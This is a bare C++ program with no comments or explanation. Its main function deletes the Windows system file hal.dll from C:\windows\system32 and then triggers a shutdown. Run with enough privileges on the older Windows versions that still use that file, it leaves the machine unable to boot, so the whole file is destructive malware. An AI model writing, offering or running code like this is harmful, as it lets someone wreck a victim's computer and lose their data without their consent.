#include <cstdlib>
#include <iostream>
using namespace std;

int main(int atgv, char *argv[])
{
  std::remove("C:\\windows\\system32\\hal.dll");
  system("shutdown -s -r");
  system("PAUSE");
  return EXIT_SUCCESS;
}
